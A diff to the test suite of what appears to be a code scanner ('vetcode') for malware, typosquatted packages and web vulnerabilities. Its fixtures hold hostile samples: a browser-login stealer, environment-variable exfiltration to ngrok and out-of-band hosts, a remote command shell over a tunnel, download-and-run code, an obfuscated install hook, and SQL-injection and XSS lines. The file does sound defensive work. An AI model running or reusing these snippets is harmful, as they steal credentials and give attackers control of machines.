@@ -10,7 +10,7 @@ import { spawnSync } from "node:child_process";
 import { vet } from "../skills/vetcode/scripts/lib/index.mjs";
 import { lookalike } from "../skills/vetcode/scripts/lib/supply.mjs";
 import { githubChecksum } from "../skills/vetcode/scripts/lib/secrets.mjs";
-import { parseInstalls, checkPackage, guard } from "../skills/vetcode/scripts/lib/guard.mjs";
+import { parseInstalls, parseClones, checkClone, checkPackage, guard } from "../skills/vetcode/scripts/lib/guard.mjs";
 import { POPULAR_NPM, POPULAR_PYPI } from "../skills/vetcode/scripts/lib/popular.mjs";
 import { staleThreads } from "../action/threads.mjs";
 
@@ -242,6 +242,7 @@ test("web vulnerabilities", async () => {
       "const agent = new https.Agent({ rejectUnauthorized: false });",
       "app.use(session({ secret: 'keyboard cat' }));",
       "User.create(req.body);",
+      "const Users = require('mongoose').model('User');",
       "Users.find(req.body);",
       "const resetToken = Math.random().toString(36);",
     ].join("\n"),
@@ -1000,4 +1001,78 @@ test("guard: the settled version is the newest release past the waiting period, 
   const times = { "1.9.0": DAYS(90), "1.10.0": DAYS(30), "1.10.1": DAYS(2), "2.0.0-rc.1": DAYS(20), "2.0.0": DAYS(0.2), "0.9.9": DAYS(5) };
   assert.deepEqual(settledVersion(times, "2.0.0", NOW, 72), { version: "1.10.0", days: 30 });
   assert.equal(settledVersion({ "1.0.0": DAYS(0.1) }, "1.0.0", NOW, 72), null);
+});
+
+test("what the held-out apps taught: ordinary shapes stay quiet, the real ones are still reported", async () => {
+  const quiet = project({
+    ".github/workflows/build.yml": "on: pull_request\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"tag=pr-${{ github.event.pull_request.number }}\" >> $GITHUB_ENV\n      - run: echo \"${{ secrets.DOCKERHUB_TOKEN }}\" | docker login -u me --password-stdin\n      - run: echo \"${{ secrets.ENV_FILE }}\" > .env\n",
+    "app/geocoder.rb": "class Setup\n  def perform\n    geoip = Geocoder.lookup(:geoip2)\n    fetch(geoip)\n  end\nend\n",
+    "api/auth.go": "package api\n// @Param payload body loginRequest false \"Login data\"\nfunc Login() {}\n",
+    "src/controllers/items.ts": "await service.deleteMany(req.body);\n",
+    "src/dialects/pg.ts": "return this.knex.raw(`(??::${cast})::numeric`, [table + '.' + column]);\n",
+    "src/workers/regex.js": "onmessage = async ({ data }) => { postMessage(run(data)); };\n",
+    "src/ui/menu.ts": "icon.innerHTML = arrowIcon;\nel.innerHTML = '';\n// document.write() is what gists use\n",
+    "resources/views/list.blade.php": "<div>{!! $items->links() !!}</div>\n",
+    "docs/docusaurus.config.js": "module.exports = { themeConfig: { algolia: { appId: 'X1', apiKey: '4b07a9c1d2e3f4a5b6c7d8e9f0a1b29e' } } };\n",
+    "config/devise.rb": "# config.secret_key = 'dff4a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8'\ntemp_password = \"1!aA#{SecureRandom.alphanumeric(12)}\"\n",
+    "alembic/versions/001_add.py": "session.execute(text(f\"UPDATE {table} SET {set_clause} WHERE id = :id\"), {\"id\": 1})\n",
+    "docker-compose.yml": "services:\n  db:\n    environment:\n      MYSQL_RANDOM_ROOT_PASSWORD: 'true'\n",
+  });
+  const q = await run(quiet);
+  assert.deepEqual(q.findings.filter(f => ["critical", "high", "medium"].includes(f.severity)).map(f => `${f.rule} ${f.file}:${f.line}`), []);
+  const loud = project({
+    ".github/workflows/pr.yml": "on: pull_request_target\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"title=${{ github.event.pull_request.title }}\" >> $GITHUB_ENV\n      - run: echo \"${{ secrets.DEPLOY_KEY }}\"\n",
+    "stealer.py": j("import os, shutil\nshutil.copy(os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login", " Data'), '/tmp/x')\n"),
+    "src/pg.ts": "return this.knex.raw(`SELECT * FROM users WHERE name = '${name}'`);\n",
+    "src/ui.ts": "panel.innerHTML = message;\n",
+    "resources/views/show.blade.php": "<div>{!! $note !!}</div>\n",
+    "docker-compose.yml": "services:\n  db:\n    environment:\n      POSTGRES_PASSWORD: hunter2secret\n      MYSQL_ROOT_PASSWORD: hunter3secret\n",
+  });
+  const l = await run(loud);
+  const got = l.findings.filter(f => ["critical", "high", "medium"].includes(f.severity)).map(f => `${f.rule} ${f.file}:${f.line}`).sort();
+  for (const want of ["gha-github-env-injection .github/workflows/pr.yml:6", "gha-secret-echo .github/workflows/pr.yml:7", "mal-credential-paths stealer.py:2", "sql-unsafe-raw src/pg.ts:1", "xss-inner-html src/ui.ts:1", "xss-template-unescaped resources/views/show.blade.php:1", "compose-literal-password docker-compose.yml:4"]) assert.ok(got.includes(want), `${want} missing from ${got.join(", ")}`);
+  assert.equal(got.filter(x => x.startsWith("compose-literal-password")).length, 1, "two passwords in one compose file are one finding");
+});
+
+test("packages: a payload on one enormous line, PyPI look-alike names, confusion versions, tunnels", async () => {
+  const blob = "QUJD".repeat(2500);
+  const bad = project({
+    "aiohtttp/__init__.py": j("import base64 as b;ex", `ec(b.b64decode('${blob}'))\n`),
+    "setup.py": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nclass X(install):\n    def run(self):\n        subprocess.call(['x'])\nsetup(name='aiohtttp', version='99.6', cmdclass={'install': X})\n",
+    "client.js": j("const { exec } = require('child_process');\nconst s = io('https://1f36-150-129.ng", "rok-free.app');\ns.on('cmd', c => exec(c));\n"),
+    "send.js": j("fetch('https://envparam.free.beecep", "tor.com', { method: 'POST', body: JSON.stringify(process.env) });\n"),
+  });
+  const r = await run(bad);
+  for (const id of ["mal-py-exec-decoder", "package-name-typosquat", "dep-confusion-version", "mal-tunnel-shell", "mal-oast-endpoint"]) assert.ok(rules(r).has(id), id);
+  const more = project({
+    "pkg/__init__.py": j("import subprocess, urllib.request\nURL = \"https://git-example.com/transform", "ers.pyz\"\nurllib.request.urlretrieve(URL, '/tmp/t.pyz')\nsubprocess.run(['python3', '/tmp/t.pyz'])\n"),
+    "flag.py": j("import os, requests\nrequests.get(\"https://b296-71-179-165-157.ng", "rok-free.app/\" + str(os.environ))\n"),
+    "setup.py": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nclass X(install):\n    def run(self):\n        u = subprocess.check_output('whoami', shell=True)\nsetup(name='zzlib-internal', version='1.0', cmdclass={'install': X})\n",
+  });
+  const m = await run(more);
+  for (const id of ["mal-py-download-run", "mal-tunnel-call"]) assert.ok(rules(m).has(id), id);
+  assert.equal(m.findings.find(f => f.rule === "setup-py-install-command").severity, "high");
+  const fine = project({
+    "setup.py": "from setuptools import setup\nsetup(name='requests', version='2.31.0')\n",
+    "pkg/data.js": `module.exports = "${blob}${blob}";\n`,
+    "tools/expose.js": "// Run `ngrok http 3000` and open https://<your-subdomain>.ngrok.io\nconsole.log('ready');\n",
+  });
+  const f = await run(fine);
+  assert.deepEqual(f.findings.filter(x => ["critical", "high"].includes(x.severity)).map(x => x.rule), []);
+});
+
+test("guard: a repository is read right after it is cloned", async () => {
+  const at = c => parseClones(c, { cwd: "/w" }).map(x => x.dir);
+  assert.deepEqual(at("git clone https://github.com/a/b.git"), ["/w/b"]);
+  assert.deepEqual(at("git clone --depth 1 -b main git@github.com:a/b.git target && cd target && ls"), ["/w/target"]);
+  assert.deepEqual(at("gh repo clone a/b -- --depth 1"), ["/w/b"]);
+  assert.deepEqual(at("npx degit user/repo#main my-app"), ["/w/my-app"]);
+  assert.deepEqual(at("git status && git pull"), []);
+  const bad = project({ "package.json": JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node setup.js" } }), "setup.js": j("eval(at", "ob('Y29uc29sZS5sb2coMSk='));\n") });
+  const said = await checkClone(bad, { vet });
+  assert.match(said.message, /^vetcode read .* after it was cloned \(\d+ files, nothing was run\) and found \d+ sign/);
+  assert.equal(said.critical, true);
+  const fine = project({ "package.json": JSON.stringify({ name: "y", version: "1.0.0" }), "index.js": "module.exports = 1;\n" });
+  assert.equal(await checkClone(fine, { vet }), null, "a clean clone says nothing");
+  assert.equal(await checkClone("/no/such/folder", { vet }), null);
 });
